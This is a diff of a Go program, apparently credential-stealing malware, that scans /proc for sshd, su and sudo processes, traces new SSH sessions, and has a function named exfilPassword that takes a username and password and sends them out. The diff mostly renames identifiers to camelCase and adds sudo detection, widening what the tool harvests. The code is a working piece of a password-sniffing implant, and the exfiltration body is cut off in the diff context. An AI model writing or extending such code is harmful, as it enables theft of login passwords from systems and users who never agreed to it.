@@ -13,8 +13,8 @@ import (
 	"time"
 )
 
-func find_pids() []int {
-	var sshd_pids []int
+func findPids() []int {
+	var sshdPids []int
 	currentPID := os.Getpid()
 	procDirs, err := ioutil.ReadDir("/proc")
 	if err != nil {
@@ -24,30 +24,38 @@ func find_pids() []int {
 		if dir.IsDir() {
 			pid, err := strconv.Atoi(dir.Name())
 			if err == nil && pid != currentPID {
-				sshd_pids = append(sshd_pids, pid)
+				sshdPids = append(sshdPids, pid)
 			}
 		}
 	}
-	return sshd_pids
+	return sshdPids
 }
 
-func is_SSH_PID(pid int) bool {
-	cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+func isSSHPid(pid int) bool {
+	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
 	if err != nil {
 		return false
 	}
-	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
+	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
 }
 
-func is_SU_PID(pid int) bool {
-	cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+func isSUPid(pid int) bool {
+	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
 	if err != nil {
 		return false
 	}
-	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
+	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
 }
 
-func exfil_password(username, password string) {
+func isSUDOPid(pid int) bool {
+	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+	if err != nil {
+		return false
+	}
+	return regexp.MustCompile(`^sudo `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
+}
+
+func exfilPassword(username, password string) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		return
@@ -64,23 +72,23 @@ func exfil_password(username, password string) {
 
 func main() {
 	var processedFirstPID bool
-	var processed_pids []int
-	var processedPIDsMutex sync.Mutex
+	var processedPids []int
+	var processedPidsMutex sync.Mutex
 
 	for {
-		sshdPids := find_pids()
+		sshdPids := findPids()
 		for _, pid := range sshdPids {
-			processedPIDsMutex.Lock()
-			if is_SSH_PID(pid) && (!processedFirstPID || !contains(processed_pids, pid)) {
+			processedPidsMutex.Lock()
+			if isSSHPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
 					//fmt.Println("SSHD process found with PID:", pid)
 					go traceSSHDProcess(pid)
-					processed_pids = append(processed_pids, pid)
+					processedPids = append(processedPids, pid)
 				}
 			}
-			if is_SU_PID(pid) && (!processedFirstPID || !contains(processed_pids, pid)) {
+			if isSUPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
@@ -90,7 +98,7 @@ func main() {
 				}
 			}
 
-			processedPIDsMutex.Unlock()
+			processedPidsMutex.Unlock()
 		}
 		time.Sleep(250 * time.Millisecond)
 	}
